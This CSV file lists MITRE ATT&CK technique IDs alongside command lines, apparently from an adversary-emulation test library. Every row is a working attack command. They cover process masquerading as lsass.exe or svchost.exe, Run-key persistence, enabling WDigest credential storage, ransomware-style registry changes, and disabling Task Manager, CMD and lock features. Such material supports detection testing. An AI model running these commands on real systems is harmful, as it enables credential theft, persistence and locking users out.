mitre_id,technique_name,command
T1036,Creating W32Time similar named service using schtasks,"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\t1036.004_nonexistingscript.ps1"" /tn win32times /f schtasks /query /tn win32times"
T1036,Creating W32Time similar named service using sc,"sc create win32times binpath= ""cmd /c start c:\t1036.004_nonexistingscript.ps1"" sc qc win32times"
T1036,linux rename /proc/pid/comm using prctl,"#{exe_path} & ps tmp=`ps | grep totally_legit` if [ -z ""${tmp}"" ] ; then echo ""renamed process not found in process list"" && exit 1; fi exit 0"
T1036,Hiding a malicious process with bind mounts,"eval '(while true; do :; done) &' echo $! > /tmp/evil_pid.txt random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1) sudo mount -b /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)"
T1553,Code Signing Policy Modification,bcdedit /set testsigning on
T1036,Masquerading as Windows LSASS process,copy %systemroot%\system32\cmd.exe %systemroot%\temp\lsass.exe %systemroot%\temp\lsass.exe /b
T1036,Masquerading as FreeBSD or Linux crond process.,cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond
T1036,Masquerading - cscript.exe running as notepad.exe,copy %systemroot%\system32\cscript.exe %appdata%\notepad.exe /y cmd.exe /c %appdata%\notepad.exe /b
T1036,Masquerading - wscript.exe running as svchost.exe,"copy %systemroot%\system32\wscript.exe %appdata%\svchost.exe /y cmd.exe /c %appdata%\svchost.exe ""pathtoatomicsfolder\..\externalpayloads\t1036.003\src\t1036.003_masquerading.vbs"""
T1036,Masquerading - powershell.exe running as taskhostw.exe,copy %windir%\system32\windowspowershell\v1.0\powershell.exe %appdata%\taskhostw.exe /y cmd.exe /k %appdata%\taskhostw.exe
T1036,Masquerading - non-windows exe running as windows exe,"copy ""#{inputfile}"" #{outputfile} try { $myt1036_003 = (start-process -passthru -filepath #{outputfile}).id } catch { $_; exit $_.exception.hresult} stop-process -id $myt1036_003"
T1036,Masquerading - windows exe running as different windows exe,"copy ""#{inputfile}"" #{outputfile} $myt1036_003 = (start-process -passthru -filepath #{outputfile}).id stop-process -id $myt1036_003"
T1036,Malicious process Masquerading as LSM.exe,copy c:\windows\system32\cmd.exe c:\lsm.exe c:\lsm.exe /c echo t1036.003 > c:\t1036.003.txt
T1027,Decode Eicar File and Write to File,"$encodedstring = ""wdvpivalqefqwzrcufpyntqouf4pn0ndktd9jevjq0fslvnuqu5eqvjelufovelwsvjvuy1urvnuluzjteuhjegrsco="" $bytes = [system.convert]::frombase64string($encodedstring) $decodedstring = [system.text.encoding]::utf8.getstring($bytes) #write the decoded eicar string to file $decodedstring | out-file t1027.013_decodedeicar.txt"
T1027,Decrypt Eicar File and Write to File,"$encryptedstring = ""76492d1116743f0423413b16050a5345mgb8agkaswa0ahmabwbxafoaagbkafoatabxagiadaa5afcawab1afmanabvaeeapqa9ahwazqbjagmangawadqazaa0agqamqawaduayga4adaamgbmadkazgbjadeanqbjagmanqbiagmanwa2agyanqbmaduanabhagiaygayagmanqa1agqamga5adeanabkaduamgbiagmanga2agmamaaxaduazabjadaaoabjagianaa1aduanwbjadcazqblagqaygaxadeaoqa4agiamwawadmanwawadaanqa2adqaoaa4adkazga4admazqa4adgaoqbiageamaa2admamqayadyamwbiaguamaaxadganaa0adyaoaaxadqanqawaguanwbkadkanabjadcanqaxadgayqa2admanqa4agiayga1adkanqazagiamwaxadyaoaawadqamgbmadcazqbjadyanqa5agianwbkaduaoaayageamgbiadeamqazagqanabkadkazga3admamabiadgaoqaxadaanaa4adcaoqa5adeayqa1adyazaazadqanwa3agyangayadcamaawadeamqa4adeazga5aduaygbmagyanqa3adqazqa4aguamaaxaduanwawagqanabiadmamwa2adganwa0agianwayadmamqbhadkazabhadeanqazadqamgazadeanwaxadaazgaxadkayqa1adeamqa="" $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 $decrypt = convertto-securestring -string $encryptedstring -key $key $decryptedstring = [runtime.interopservices.marshal]::ptrtostringbstr([runtime.interopservices.marshal]::securestringtobstr($decrypt)) #write the decrypted eicar string to a file $decryptedstring | out-file t1027.013_decryptedeicar.txt"
T1112,Modify Registry of Current User Profile - cmd,reg add hkey_current_user\software\microsoft\windows\currentversion\explorer\advanced /t reg_dword /v hidefileext /d 1 /f
T1112,Modify Registry of Local Machine - cmd,reg add hkey_local_machine\software\microsoft\windows\currentversion\run /t reg_expand_sz /v securityhealth /d #{new_executable} /f
T1112,Modify registry to store logon credentials,reg add hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential /t reg_dword /d 1 /f
T1112,Use Powershell to Modify registry to store logon credentials,set-itemproperty -force -path 'hklm:\system\currentcontrolset\control\securityproviders\wdigest' -name 'uselogoncredential' -value '1' -erroraction ignore
T1112,Add domain to Trusted sites Zone,"$key= ""hkcu:\software\microsoft\windows\currentversion\internet settings\zonemap\domains\#{bad_domain}\"" $name =""bad-subdomain"" new-item $key -name $name -force new-itemproperty $key$name -name https -value 2 -type dword; new-itemproperty $key$name -name http -value 2 -type dword; new-itemproperty $key$name -name * -value 2 -type dword;"
T1112,Javascript in registry,"new-itemproperty ""hkcu:\software\microsoft\windows\currentversion\internet settings"" -name t1112 -value ""<script>"""
T1112,Change Powershell Execution Policy to Bypass,set-executionpolicy -executionpolicy bypass -scope localmachine
T1112,BlackByte Ransomware Registry Changes - CMD,cmd.exe /c reg add hklm\software\microsoft\windows\currentversion\policies\system /v localaccounttokenfilterpolicy /t reg_dword /d 1 /f cmd.exe /c reg add hklm\software\microsoft\windows\currentversion\policies\system /v enablelinkedconnections /t reg_dword /d 1 /f cmd.exe /c reg add hklm\system\currentcontrolset\control\filesystem /v longpathsenabled /t reg_dword /d 1 /f
T1112,BlackByte Ransomware Registry Changes - Powershell,"new-itemproperty ""hklm:\software\microsoft\windows\currentversion\policies\system"" -name localaccounttokenfilterpolicy -propertytype dword -value 1 -force new-itemproperty ""hklm:\software\microsoft\windows\currentversion\policies\system"" -name enablelinkedconnections -propertytype dword -value 1 -force new-itemproperty ""hklm:\system\currentcontrolset\control\filesystem"" -name longpathsenabled -propertytype dword -value 1 -force"
T1112,Disable Windows Registry Tool,reg add hkey_current_user\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d 1 /f
T1112,Disable Windows CMD application,"new-itemproperty -path ""hkcu:\software\policies\microsoft\windows\system"" -name disablecmd -value 1"
T1112,Disable Windows Task Manager application,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disabletaskmgr /t reg_dword /d 1 /f"
T1112,Disable Windows Notification Center,reg add hkey_current_user\software\policies\microsoft\windows\explorer /v disablenotificationcenter /t reg_dword /d 1 /f
T1112,Disable Windows Shutdown Button,"reg add ""hkey_local_machine\software\microsoft\windows\currentversion\policies\system"" /v shutdownwithoutlogon /t reg_dword /d 0 /f"
T1112,Disable Windows LogOff Button,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nologoff /t reg_dword /d 1 /f reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v startmenulogoff /t reg_dword /d 1 /f"
T1112,Disable Windows Change Password Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disablechangepassword /t reg_dword /d 1 /f"
T1112,Disable Windows Lock Workstation Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disablelockworkstation /t reg_dword /d 1 /f"
T1112,Activate Windows NoDesktop Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nodesktop /t reg_dword /d 1 /f"
T1112,Activate Windows NoRun Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v norun /t reg_dword /d 1 /f"
T1112,Activate Windows NoFind Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nofind /t reg_dword /d 1 /f"
T1112,Activate Windows NoControlPanel Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nocontrolpanel /t reg_dword /d 1 /f"
T1112,Activate Windows NoFileMenu Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nofilemenu /t reg_dword /d 1 /f"
T1112,Activate Windows NoClose Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v noclose /t reg_dword /d 1 /f"
T1112,Activate Windows NoSetTaskbar Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nosettaskbar /t reg_dword /d 1 /f"
T1112,Activate Windows NoTrayContextMenu Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v notraycontextmenu /t reg_dword /d 1 /f"
T1112,Activate Windows NoPropertiesMyDocuments Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nopropertiesmydocuments /t reg_dword /d 1 /f"
T1112,Hide Windows Clock Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hideclock /t reg_dword /d 1 /f"
T1112,Windows HideSCAHealth Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescahealth /t reg_dword /d 1 /f"
T1112,Windows HideSCANetwork Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescanetwork /t reg_dword /d 1 /f"
T1112,Windows HideSCAPower Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescapower /t reg_dword /d 1 /f"
